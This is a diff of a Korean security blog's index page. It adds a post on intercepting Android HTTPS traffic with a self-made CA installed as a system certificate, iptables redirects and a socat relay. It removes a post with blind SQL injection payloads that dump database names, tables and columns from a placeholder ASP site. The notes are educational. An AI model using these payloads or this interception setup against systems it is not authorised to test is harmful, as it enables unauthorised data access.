@@ -9,9 +9,7 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="Terminology IMSI: Internation Mobile Subscriber Identity
-MIN: Mobile Identify Number
-MDN: Mobile Directory Number MIN 은 원래 북미의 이동전화 단말기를 식별하기 위한 &hellip;">
+  <meta name="description" content="안드로이드 HTTPS 트래픽 디버깅 하는 방법은 Intercepting and decrypting SSL communications between Android phone and 3rd party server 을 참조한다. 안드로이드에 임의의 CA &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -67,6 +65,87 @@ MDN: Mobile Directory Number MIN 은 원래 북미의 이동전화 단말기를 
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/07/21/intercepting-and-decrypting-ssl-communications-between-android-phone-and-3rd-party-server/">Intercepting and Decrypting SSL Communications Between Android Phone and 3rd Party Server</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-07-21T12:39:58+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2014</span></span> <span class='time'>12:39 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>안드로이드 HTTPS 트래픽 디버깅 하는 방법은 <a href="http://www.myhowto.org/java/81-intercepting-and-decrypting-ssl-communications-between-android-phone-and-3rd-party-server/">Intercepting and decrypting SSL communications between Android phone and 3rd party server</a> 을 참조한다.</p>
+
+<p>안드로이드에 임의의 CA certificate 을 system 으로 인스톨하는 방법은 <a href="http://wiki.pcprobleemloos.nl/android/cacert">Installing CAcert certificates on Android as &lsquo;system&rsquo; credentials without lockscreen - instructions</a> 을 참조한다.</p>
+
+<p>DigitalOcean 에서 <a href="https://www.digitalocean.com/community/tutorials/how-to-setup-your-own-vpn-with-pptp">How To Setup Your Own VPN With PPTP</a> 를 참조해 VPN 서버를 설치한다.</p>
+
+<p>전체적으로는 <a href="https://github.com/blukat29/blukat-config/issues/4">blukat29/PPTP VPN Server</a> 를 참조한다.</p>
+
+<pre><code>$ echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+$ iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+$ iptables -t nat -A PREROUTING -i ppp0 -p tcp --dport 443 -j REDIRECT --to-port 4443
+
+# Generate CA key
+$ openssl genrsa -des3 -out ca.key 4096
+
+# Generate CA cert
+$ openssl req -new -x509 -days 365 -key ca.key -out ca.crt
+
+# Generate server key
+$ openssl genrsa -des3 -out server.key 4096
+
+# Generate server cert signing request
+$ openssl req -new -key server.key -out server.csr
+
+# Sign server's cert using CA's key
+$ openssl x509 -req -days 365 -in server.csr -CA ca.crt -CAkey ca.key -set_serial 01 -out server.crt
+
+# Get the hash of the ca.crt certificate:
+$ openssl x509 -inform PEM -subject_hash_old -in ca.crt | head -1  
+5ed36f99
+$ mount -o remount,rw /system
+$ cp /data/local/tmp/5ed36f99.0 /system/etc/security/cacerts/
+$ chmod 644 /system/etc/security/cacerts/*
+
+$ cat go.sh
+socat -v OPENSSL-LISTEN:4443,reuseaddr,verify=0,cert=./server.crt,key=./server.key,cafile=./ca.crt,debug,fork EXEC:./babo.sh
+$ cat babo.sh
+openssl s_client -CAfile /etc/ssl/certs/ca-certificates.crt -quiet -connect api.babo.com:443
+$ go.sh
+
+ext% /usr/libexec/java_home
+/Library/Java/JavaVirtualMachines/jdk1.7.0_25.jdk/Contents/Home
+</code></pre>
+
+<ul>
+<li>OpenSSL</li>
+<li>SoCat (<a href="http://www.dest-unreach.org/socat">http://www.dest-unreach.org/socat</a>)</li>
+<li>Bouncy Castle library (<a href="http://bouncycastle.org/download/bcprov-jdk16-141.jar">http://bouncycastle.org/download/bcprov-jdk16-141.jar</a>) - place this JAR file into your &hellip;/jre/lib/ext directory</li>
+<li>Charles Proxy</li>
+<li><a href="http://mitmproxy.org">MITMProxy</a></li>
+<li><code>emulator -avd [name of the avd] -http-proxy 127.0.0.1:8080</code></li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -657,110 +736,6 @@ Load command 12
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/06/14/blind-sql-injection/">Blind SQL Injection</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-06-14T01:49:20+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>1:49 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><h4>Blind SQL injection</h4>
-
-<p>Case</p>
-
-<pre><code>UNAME = "' or (ascii(substr(select user(),1,1))&gt;63) --"
-PASS = ""
-QUERY = "select * from users where uname='" +UNAME+ "' and pass='" +PASS+ "'"
-</code></pre>
-
-<p>이런 상황에서 QUERY 는 다음과 같이 eval 된다.</p>
-
-<pre><code>select * from users where uname='' or (ascii(substr(select user(),1,1))&gt;63) --' and pass=''
-</code></pre>
-
-<p><code>uname=''</code> 을 만족하는 row 는 없을테니, <code>or</code> 뒷부분에 따라, 전체 query 의 결과가 달라진다.
-이 차이가 HTTP Response Code 로 나타날 수도 있고, data 의 내용에 차이가 생길수도 있다.
-SQL WaitFor 로 Delay 를 삽입할 수도 있다.
-Query 결과가 화면에 덤프되지는 않지만, 이런 미세한 차이를 보고 query 의 결과값을 추측하는 것이다.</p>
-
-<p>우선 DB 종류를 확인.</p>
-
-<pre><code>http://xxx.xxx.com/abc.asp?idConc=555%27%20or%20ascii(substring((select%20@@version),1,1))=94--
-</code></pre>
-
-<p>DB 이름을 덤프.</p>
-
-<pre><code>http://xxx.xxx.com/abc.asp?idConc=555%27%20or%20ascii(substring((select%20DB_NAME(0)),1,1))=94--
-</code></pre>
-
-<p>TABLE 을 덤프.</p>
-
-<pre><code>http://xxx.xxx.com/abc.asp?idConc=555%27%20or%20ascii(substring((select%20top%201%20TABLE_NAME%20from%20INFORMATION_SCHEMA.TABLES),1,1))=94--
-</code></pre>
-
-<p>TABLE schema 를 덤프.</p>
-
-<pre><code>select top 1 COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='xxx_acesso';
-</code></pre>
-
-<p>그럼 쓸만한 query 들을 얻기 위해, Havij 가 사용하는 SQL query 들을 분석하도록 한다.</p>
-
-<h4>Havij</h4>
-
-<ul>
-<li><a href="http://www.troyhunt.com/2012/10/hacking-is-childs-play-sql-injection.html">Hacking is child&rsquo;s play - SQL injection with Havij by 3 year old</a></li>
-<li><a href="http://www.youtu.be/Fp47G4MQFvA">YouTube: Hacking is child&rsquo;s play - SQL injection with Havij by 3 year old</a></li>
-</ul>
-
-
-<h4>BBQSQL</h4>
-
-<ul>
-<li><a href="http://www.youtube.com/watch?v=Dh9Pa0kDfsc">DEFCON 20: Rapid Blind SQL Injection</a></li>
-<li><a href="https://github.com/Neohapsis/bbqsql">bbqsql github repo</a></li>
-</ul>
-
-
-<h4>SQL injection 에 관해 읽을만한 글은</h4>
-
-<ul>
-<li><a href="https://media.blackhat.com/bh-us-12/Turbo/Galbreath/BH_US_12_Galbreath_Libinjection_Slides.pdf">libinjection</a></li>
-<li><a href="http://www.slideshare.net/nickgsuperstar/new-techniques-in-sql-obfuscation">New Techniques in SQLi Obfuscation</a></li>
-</ul>
-
-
-<h4>Tools</h4>
-
-<ul>
-<li>bbqsql</li>
-<li>sqlmap</li>
-<li>sqlninja</li>
-<li>BSQL Hacker</li>
-<li>the Mole</li>
-<li>Havij</li>
-</ul>
-
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/14">&larr; Older</a>
@@ -778,6 +753,10 @@ Query 결과가 화면에 덤프되지는 않지만, 이런 미세한 차이를 
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/01/15/tf-idf/">TF-IDF</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/01/13/android-hackers-handbook/">Android Hacker's Handbook</a>
       </li>
     
@@ -791,10 +770,6 @@ Query 결과가 화면에 덤프되지는 않지만, 이런 미세한 차이를 
     
       <li class="post">
         <a href="/blog/2016/01/11/sock-sendpage/">Sock_sendpage</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2015/12/23/on-the-juniper-backdoor/">On the Juniper Backdoor</a>
       </li>
     
   </ul>
